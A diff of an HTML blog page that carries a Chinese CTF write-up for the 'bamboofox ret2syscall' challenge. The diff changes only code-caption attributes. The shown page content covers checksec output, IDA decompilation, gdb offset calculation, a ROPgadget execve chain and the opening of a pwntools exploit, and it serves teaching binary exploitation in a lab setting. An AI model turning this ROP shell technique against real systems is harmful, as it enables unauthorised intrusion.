@@ -491,7 +491,7 @@
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
         <p>程序源码</p>
-<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy=""><span class="code-caption-label"></span><a class="code-caption-copy"></a></p><p></p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
 <span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
 
@@ -512,7 +512,7 @@
 <span class="token punctuation">}</span>
 </code></pre>
 <p>检查程序</p>
-<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy=""><span class="code-caption-label"></span><a class="code-caption-copy"></a></p><p></p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec rop
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/rop'</span>
     Arch:     i386-32-little
@@ -524,7 +524,7 @@ ios@ubuntu:~$
 </code></pre>
 <p>NX开启</p>
 <p>载入IDA分析</p>
-<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy=""><span class="code-caption-label"></span><a class="code-caption-copy"></a></p><p></p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
   <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-64h]</span>
@@ -539,12 +539,12 @@ ios@ubuntu:~$
 </code></pre>
 <p>由于题目包含了libc所以可以直接使用ropchain getshell</p>
 <p>本题有个不理解的点 就是v4的偏移 直接ida的偏移是错的 所以在此记录 正确偏移的分析方法<br><img src="/2018/06/18/bamboofox-ret2syscall/1.jpg" alt="ida1"><br>在gets处下断</p>
-<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy=""><span class="code-caption-label"></span><a class="code-caption-copy"></a></p><p></p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-bash"><code class="language-bash">gdb-peda$ b* 0x8048E96
 Breakpoint 2 at 0x8048e96: <span class="token function">file</span> rop.c, line 15.
 </code></pre>
 <p>尝试运行到gets处</p>
-<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy=""><span class="code-caption-label"></span><a class="code-caption-copy"></a></p><p></p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-bash"><code class="language-bash">gdb-peda$ c
 Continuing.
 This time, no system<span class="token punctuation">(</span><span class="token punctuation">)</span> and NO SHELLCODE<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>
@@ -588,22 +588,22 @@ Breakpoint 2, 0x08048e96 <span class="token keyword">in</span> main <span class=
 15    <span class="token keyword">in</span> rop.c
 </code></pre>
 <h3 id="此时-esp-0xffffd030"><a href="#此时-esp-0xffffd030" class="headerlink" title="此时 esp 0xffffd030"></a>此时 esp 0xffffd030</h3><h3 id="ebp-0xffffd0b8"><a href="#ebp-0xffffd0b8" class="headerlink" title="ebp 0xffffd0b8"></a>ebp 0xffffd0b8</h3><p>因为 int v4; // [esp+1Ch] [ebp-64h]<br>所以 此时v4地址为 0xffffd04c</p>
-<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy=""><span class="code-caption-label"></span><a class="code-caption-copy"></a></p><p></p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-bash"><code class="language-bash">gdb-peda$ p/x 0xffffd030+0x1c
 <span class="token variable">$3</span> <span class="token operator">=</span> 0xffffd04c
 </code></pre>
 <p>接着计算v4到ebp的距离</p>
-<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy=""><span class="code-caption-label"></span><a class="code-caption-copy"></a></p><p></p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-bash"><code class="language-bash">gdb-peda$ p/x 0xffffd0b8-0xffffd04c
 <span class="token variable">$6</span> <span class="token operator">=</span> 0x6c
 gdb-peda$ p/d 0xffffd0b8-0xffffd04c
 <span class="token variable">$7</span> <span class="token operator">=</span> 108
 </code></pre>
 <p>可以得到v4到ebp的偏移为108 所以到ret的偏移为108+4=112<br>接着使用ROPgadget生成ropchain</p>
-<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy=""><span class="code-caption-label"></span><a class="code-caption-copy"></a></p><p></p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre><code>ROPgadget --binary rop –-ropchain
 </code></pre><p>找到</p>
-<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy=""><span class="code-caption-label"></span><a class="code-caption-copy"></a></p><p></p>
+<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python2</span>
     <span class="token comment" spellcheck="true"># execve generated by ROPgadget</span>
 
@@ -648,7 +648,7 @@ gdb-peda$ p/d 0xffffd0b8-0xffffd04c
     p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08049421</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># int 0x80</span>
 </code></pre>
 <p>接着改写为exp</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy=""><span class="code-caption-label"></span><a class="code-caption-copy"></a></p><p></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-python"><code class="language-python">
 <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 <span class="token keyword">from</span> struct <span class="token keyword">import</span> pack
